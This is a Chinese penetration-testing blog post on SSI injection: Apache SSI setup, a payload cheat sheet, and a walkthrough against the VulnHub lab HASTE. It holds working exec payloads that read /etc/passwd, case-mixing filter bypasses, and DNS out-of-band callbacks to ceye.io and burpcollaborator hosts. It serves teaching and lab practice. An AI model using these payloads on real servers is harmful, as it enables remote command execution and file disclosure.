---
title: "聊聊经典的ssi注入"
slug: gai7iy
date: 2021-06-11T15:26:47+08:00
source: yuque/penetration
---

# 0x00 速查表
+ 关键词`exec`、`cmd`不区分大小写，可考虑大小写组合绕过

```bash
"-->'-->`--><!--#set var="wyk" value="vxjn0kj8s5"--><!--#set var="y0m" value="xzlp2mlau7"--><!--#echo var="wyk"--><!--#echo var="y0m"--><!--#eXEc cMd="nslookup -q=cname vul.ssi.0yuj7c.ceye.io" -->


"-->'-->`--><!--#set var="wyk" value="vxjn0kj8s5"--><!--#set var="y0m" value="xzlp2mlau7"--><!--#echo var="wyk"--><!--#echo var="y0m"--><!--#eXEc cMd="cat /etc/passwd" -->
```

常用命令

```basic
# General PoC
<!--#eXEc cMd="ping -c 4 127.0.0.1|| ping -n 4 127.0.0.1
" -->


# Linux
<!--#eXEc cMd="cat /etc/passwd" -->
<!--#Exec cmD="ls" -->
<!--#eXEc cMd="sleep 5" -->

# windows
<!--#eXEc cMd="dir" -->
```



# 0x01 概念介绍
以下内容整理自Apache httpd tutorial[[1]](http://httpd.apache.org/docs/current/howto/ssi.html)，灰色部分可以不看（<font style="color:#BFBFBF;">TL;DR</font>）：

## （1）什么是ssi
+ ssi，通常称为服务端包含（Server Side Includes），用于将动态内容添加到您现有的 HTML 页面，以下统一使用大写的SSI
+ SSI可以使您可以将动态生成的内容添加到现有的 HTML 页面，而无需通过 CGI 程序或其他动态技术提供整个页面

例如，将`<font style="color:rgb(0, 0, 0);background-color:rgb(229, 236, 243);"><!--#echo var="DATE_LOCAL" --></font>`放到的HTML中，当页面被提供时，就会显示当前的时间

```bash
Friday, 11-Jun-2021 00:34:48 PDT
```

+ <font style="color:#BFBFBF;">何时使用 SSI 以及何时让您的页面完全由某个程序生成的决定通常取决于页面中有多少是静态的，以及每次提供页面时需要重新计算多少。SSI 是添加小块信息的好方法，例如</font>`<font style="color:#BFBFBF;">当前时间</font>`<font style="color:#BFBFBF;">，如上所示。但是，如果您的大部分页面是在提供服务时生成的，则您需要寻找其他解决方案。</font>



## （2）如何配置SSI
<font style="color:rgb(0, 51, 102);">要开启ssi，需要在</font>`<font style="color:rgb(0, 51, 102);">httpd.conf</font>`<font style="color:rgb(0, 51, 102);"> </font>**<font style="color:rgb(0, 51, 102);">or </font>**`<font style="color:rgb(0, 51, 102);">.htaccess</font>`<font style="color:rgb(0, 51, 102);"> 中加上“允许解析</font>`<font style="color:rgb(0, 51, 102);">SSI</font>`<font style="color:rgb(0, 51, 102);">指令”的配置，如下</font>

```basic
Options +Includes
```

此外，还需要告诉Apache允许对哪些文件进行`SSI`解析，[官方](http://httpd.apache.org/docs/current/howto/ssi.html#page-header)介绍了两种设置方法（i、ii）：

### i 指定文件类型
依然是在配置文件中加入以下配置项

```basic
AddType text/html .shtml
AddOutputFilter INCLUDES .shtml
```

这样一来，Apache就会解析对应目录下`.shtml`文件中的`SSI`指令了。

但如果是存量代码，不想一个一个去更改页面的文件名的话，则有方法`ii`

### ii 指定XBitHack
如果想让Apache解析`.html`文件的话，除了将`.html`后缀改为`.shtml`以外，还可以配置**解析可执行的**`**.html**`

```basic
XBitHack on
```

也就是说，你想解析某个`.html`文件中的`SSI`指令，只需要对那个文件加上可执行权限（`+x`）即可

```bash
chmod +x pagename.html
```

方法ii的缺点也是很明显的：如果设置了`+x`权限的`.html`文件过多，Apache 会读取它发送给客户端的每个文件，即使不包含任何 SSI 指令，这可能会减慢响应速度。



## （3）SSI指令语法
```bash
<!--#function attribute=value attribute=value ... -->

```

+ 它的格式类似于 `HTML `注释，因此如果您没有正确启用 `SSI`，浏览器将忽略它，但它仍然会在 HTML 源代码中可见。如果您正确配置了 `SSI`，则指令将替换为其结果。

```bash
# 打印当前时间
<!--#echo var="DATE_LOCAL" -->
	Friday, 11-Jun-2021 00:34:48 PDT
```

当输入的SSI指令出现问题时，服务器通常会返回

```bash
[an error occurred while processing this directive]
```

更多语法可以在[w3](https://www.w3.org/Jigsaw/Doc/User/SSI.html#exec)里查看（但是我在接下来要介绍的靶场里试了好几条指令都没成功）。

# 0x02 漏洞利用
这里以Vulnhub的靶机[HASTE](https://www.vulnhub.com/entry/haste-1,203/)为例，介绍SSI的漏洞利用

[  
  
  
](https://www.vulnhub.com/entry/haste-1,203/)

[H.A.S.T.E: 1](https://www.vulnhub.com/entry/haste-1,203/)



访问80端口，只看到有两个表单，POST提交的参数，会在302跳转的`.shtml`页面上展示出来。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623399147354-a35af731-afbe-47e8-9f3b-e2d6f2b50c0d.png)![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623399159395-235e94b6-e094-4ad8-932d-09436332f75e.png)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623399102184-c92d9812-9846-4ef5-9468-b7824c532c72.png)

当然——存储XSS，但咱们重点并不在此。

```bash
POST /receipt.php HTTP/1.1
Host: haste
Content-Length: 98
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://haste
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4371.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://haste/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

xxx=FUZZexecFUZZ<!--#echo var="DATE_LOCAL" -->&feedback=FUZZexecFUZZ<!--#echo var="DATE_LOCAL" -->
```

`<!--#echo var="DATE_LOCAL" -->`，注入“显示时间”的代码，显然是没问题的。但执行命令却出现了问题......

```bash
<!--#exec cmd="id" -->
```

整体来说，过滤情况如下：

+ `xxx`参数替换了`<` 、`>`
+ `feedback`参数替换了小写的`exec`

没什么意思，一瞬绕过

```bash
<!--#exEc cMd="id" -->
<!--#exexecec cmd="id" -->
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623396422062-861dfa74-3c59-4257-989b-1da18c7874c4.png)

接下来就是命令执行拿shell，乏善可陈......

# 0x03 总结
1. Freebuf上的某篇文章，取的标题是【CTF之Web安全SSL注入】，`SSL`？——我愣住......
2. 实战还是遇得很少的，但基本姿势要会



有效的测试方法：

+ 针对`.shtml`后缀的网页，应该就是在有回显的地方进行FUZZ了，用以下字符串：

```bash
< ! # = / . " - > and [a-zA-Z0-9] 
```

Burp Suite也支持扫描SSI漏洞，下面是Burp使用的Payload，典型的异步漏洞（async）

```bash
"-->'-->`--><!--#set var="wyk" value="vxjn0kj8s5"--><!--#set var="y0m" value="xzlp2mlau7"--><!--#echo var="wyk"--><!--#echo var="y0m"--><!--#exec cmd="nslookup -q=cname ik6an76vfs8suy1zd1238xv1us0lojcbaz2mtai.burpcollaborator.net" -->
```

写扫描PoC时，将`burpcollaborator`换成自己的`dnslog`地址就行。

---

# 参考资料
[1] Apache httpd Tutorial: Introduction to Server Side 		Includes[http://httpd.apache.org/docs/current/howto/ssi.html](http://httpd.apache.org/docs/current/howto/ssi.html)

[2] Apache SSI 远程命令执行漏洞复现 [https://www.cnblogs.com/yuzly/p/11226439.html](https://www.cnblogs.com/yuzly/p/11226439.html)

[3] SSI Commands [https://www.w3.org/Jigsaw/Doc/User/SSI.html#exec](https://www.w3.org/Jigsaw/Doc/User/SSI.html#exec)

[4] 服务器端包含 (SSI) 注入软件攻击 | OWASP基金会[https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)

[5] WSTG - Latest | OWASP [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection)

[6] H.A.S.T.E: 1 ~ VulnHub [https://www.vulnhub.com/entry/haste-1,203/](https://www.vulnhub.com/entry/haste-1,203/)

